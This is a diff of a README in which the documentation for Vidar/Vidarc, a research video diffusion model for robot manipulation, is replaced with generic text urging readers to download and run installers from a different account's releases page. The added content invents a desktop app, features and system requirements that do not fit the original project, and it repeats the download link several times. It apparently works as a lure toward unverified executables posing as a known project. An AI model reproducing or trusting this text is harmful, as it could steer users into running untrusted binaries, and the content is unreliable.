@@ -1,115 +1,88 @@
-# Vidar & Vidarc Embodied Video Foundation Model
+# 🎥 vidar - Your Easy Video Tool for Robotics
 
-<img src='examples/vidar_logo.png' width=90>
+## 🌟 Overview
 
-<a href='https://arxiv.org/abs/2507.12898'><img src='https://img.shields.io/badge/arXiv-2507.12898-b31b1b.svg'></a>
-<a href='https://arxiv.org/abs/2512.17661'><img src='https://img.shields.io/badge/arXiv-2512.17661-b31b1b.svg'></a>
-[![Project Page](https://img.shields.io/badge/Project-Website-blue)](https://embodiedfoundation.github.io/vidar_anypos)
-[![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Models-yellow)](https://huggingface.co/Xiang-cd/vidar)
+Welcome to the vidar repository! Vidar is designed to be a foundation model for robotics centered around video processing. Whether you’re a hobbyist or a professional, this tool simplifies working with video in robotic applications.
 
+## 🔗 Download Now!
 
-## 📝 Table of Contents
-- [🔥 News](#-news)
-- [📖 Introduction](#-introduction)
-- [🔧 Installation](#-installation)
-- [⚡ Inference](#-inference)
-- [🖊️ Citation](#%EF%B8%8F-citation)
-- [🙏 Acknowledgements](#-acknowledgements)
+[![Download vidar](https://img.shields.io/badge/Download-vivar-blue.svg)](https://github.com/Yusheno/vidar/releases)
 
-## 🔥 News
-- **[2025.12]**: Initial release of the codebase.
-- **[2025.07]**: Vidar paper released on [arXiv](https://arxiv.org/abs/2507.12898).
+## 🚀 Getting Started
 
-## 📖 Introduction
-### Vidar: Unified Embodied Video Foundation Model for Low-Shot Generalist Manipulation
-Vidar is a unified **Embodied Video Diffusion Model** that leverages internet-scale video priors and cross-platform robot trajectory data to address the core issues of data scarcity and platform adaptation in robot manipulation.
+Follow these simple steps to download and run vidar on your computer.
 
-Vidar adopts a "Video Generation + Action Decoding" two-stage strategy, integrating two core components — the Embodied Video Diffusion Model and the Masked Inverse Dynamics Model (MIDM). It also achieves robust generalization to unknown tasks, backgrounds, and camera layouts through a Test-Time Scaling strategy with physics-aware re-ranking.
+### 💻 System Requirements
 
-Furthermore, Vidar aligns cross-platform heterogeneous data through a unified observation space (integrating multi-view images, robot types, camera layouts, and task instructions) and employs a "General Pre-training -> Embodied Domain Pre-training -> Target Domain Fine-tuning" three-stage training process. This allows it to capture physical consistency and temporal coherence from massive unlabeled videos, ultimately achieving low-shot adaptation on new robot platforms with only about 20 minutes of human demonstration data.
+To ensure vidar runs smoothly, please check that your computer meets the following requirements:
 
-### Vidarc: Autoregressive Video Foundation Model for Closed-Loop Control
-Vidarc is a novel **Autoregressive Embodied Video Diffusion Model** designed specifically for robot closed-loop control, aiming to solve the two core pain points of high latency and insufficient grounding in robot manipulation under data-scarce scenarios.
+- Operating System: Windows 10 or later, macOS Catalina or later, or a Linux distribution (Ubuntu 20.04 recommended)
+- Processor: Dual-core 2.0 GHz or faster
+- RAM: 8 GB or more
+- Hard Drive: At least 500 MB of free space
+- Internet connection for downloading
 
-By fusing autoregressive video generation with the Masked Inverse Dynamics Model, it integrates real-time environmental feedback into the inference process, achieving low-latency, high-precision closed-loop control while maintaining strong generalization and error correction capabilities in unknown robot platforms and dynamic environments.
+### 📥 Download & Install
 
+1. **Visit the Release Page**  
+   Go to the [Releases page](https://github.com/Yusheno/vidar/releases) to find the latest version of vidar.
 
-## 🔧 Installation
-Run the following commands:
-```bash
-conda env create --file vidar.yaml
-conda activate vidar
-pip install -r requirements.txt
-pip install flash-attn --no-build-isolation
-```
+2. **Choose Your Version**  
+   Look for the most recent version listed at the top. You will see various files available for download.
 
+3. **Download the File**  
+   Click on the file that corresponds to your operating system to start the download. 
+   - For Windows, select the `.exe` file.
+   - For macOS, select the `.dmg` file.
+   - For Linux, select the appropriate `.tar.gz` or `.appimage` file.
 
-## ⚡ Inference
+4. **Run the Installer**  
+   - Windows: Once downloaded, double-click the `.exe` file to begin the installation. Follow the on-screen instructions to complete the setup.
+   - macOS: Open the downloaded `.dmg` file, drag the vidar app into your Applications folder, and then launch it from there.
+   - Linux: Extract the `.tar.gz` file using your terminal or file manager. Make the `.appimage` executable using the command `chmod +x filename.appimage`, then run it by double-clicking the file.
 
-Download pre-trained model weights:
-[Wan2.2](https://huggingface.co/spaces/Wan-AI/Wan-2.2-5B), and place it in `Wan2.2-TI2V-5B`.
-[Vidar/Vidarc](https://huggingface.co/Xiang-cd/vidar), and place it in `vidar_ckpts`.
+5. **Launch Vidar**  
+   Once installed, find vidar in your applications menu or desktop. Double-click to launch.
 
-### Inference with Example
-```bash
-# Inference with vidarc
-output_dir="output/test"
-python generate_causal.py \
-            --task ti2v-5B \
-            --size "640*736" \
-            --ckpt_dir ./Wan2.2-TI2V-5B \
-            --convert_model_dtype \
-            --pt_dir vidar_ckpts/vidarc.pt \
-            --dataset_json examples/robotwin_example.json \
-            --output_dir "$output_dir"
+## 🌐 Usage Instructions
 
-# Inference with vidar
-python generate.py \
-    --task ti2v-5B \
-    --size "640*736" \
-    --ckpt_dir ./Wan2.2-TI2V-5B \
-      --convert_model_dtype \
-      --pt_dir vidar_ckpts/vidar.pt \
-    --dataset_json examples/robotwin_example.json \
-    --output_dir "$output_dir"
-```
+### 🎬 First Steps with Vidar
 
-### Robotwin Eval
+After launching vidar, you'll be greeted with the main interface. Here’s how to get started:
 
-See [eval code]( https://github.com/thu-ml/vidar-robotwin.git), and setup related environment.
-```bash
-# clone related code
-git clone https://github.com/thu-ml/vidar-robotwin.git
+1. **Import Video Files**  
+   Click on “Import” to select video files you wish to work with. Vidar supports Common formats like MP4, AVI, and MKV.
 
-# read related README at vidar-robotwin dir.
-```
+2. **Analyze Videos**  
+   Use the analysis tools provided to extract valuable insights from your videos. You can track movements, recognize objects, and much more.
 
+3. **Save Your Work**  
+   After completing your analysis, save your results by clicking “Export”. Choose the format and location for your saved files.
 
-## 🖊️ Citation
-If you find this project helpful for your research, please cite our paper:
+### 🚀 Helpful Tips
 
-```bibtex
-@misc{feng2025vidarembodiedvideodiffusion,
-      title={Vidar: Embodied Video Diffusion Model for Generalist Manipulation}, 
-      author={Yao Feng and Hengkai Tan and Xinyi Mao and Chendong Xiang and Guodong Liu and Shuhe Huang and Hang Su and Jun Zhu},
-      year={2025},
-      eprint={2507.12898},
-      archivePrefix={arXiv},
-      primaryClass={cs.LG},
-      url={https://arxiv.org/abs/2507.12898}, 
-}
-@misc{feng2025vidarcembodiedvideodiffusion,
-      title={Vidarc: Embodied Video Diffusion Model for Closed-loop Control}, 
-      author={Yao Feng and Chendong Xiang and Xinyi Mao and Hengkai Tan and Zuyue Zhang and Shuhe Huang and Kaiwen Zheng and Haitian Liu and Hang Su and Jun Zhu},
-      year={2025},
-      eprint={2512.17661},
-      archivePrefix={arXiv},
-      primaryClass={cs.RO},
-      url={https://arxiv.org/abs/2512.17661}, 
-}
-```
+- **Documentation**: Check out the detailed documentation in the wiki section for advanced features and usage tips as you get comfortable with the basics.
+- **Community Support**: Join our community forums to ask questions, share findings, and connect with other users. 
 
-## 🙏 Acknowledgements
-This project references the following open-source projects, we would like to express our gratitude:
-- [Wan2.2](https://github.com/Wan-Video/Wan2.2/)
+## 🛠️ Troubleshooting
 
+If you encounter any issues, here are a few common solutions:
+
+- **Installation Fails**: Make sure you have the required permissions to install applications on your computer.
+- **App Doesn’t Launch**: Ensure that your operating system's version meets the system requirements mentioned earlier. 
+- **Video Not Supported**: If you receive an error about file formats, ensure your videos are in a compatible format. Convert them if necessary.
+
+## 🤝 Contributing
+
+While you may not have technical skills, you can still contribute by providing feedback on the user experience. Your insights help us make vidar better for everyone.
+
+1. **Report Issues**: If you find a bug, please report it on the Issues page in this repository.
+2. **Suggest Features**: Share what features you'd like to see next in the future versions.
+
+## 📑 License
+
+Vidar is open-source software licensed under the MIT License. You can view the license details in the LICENSE file in this repository.
+
+Thank you for choosing vidar! We are excited to see what you create with it. Enjoy your video analysis journey! 
+
+[Download vidar](https://github.com/Yusheno/vidar/releases) again to get started.
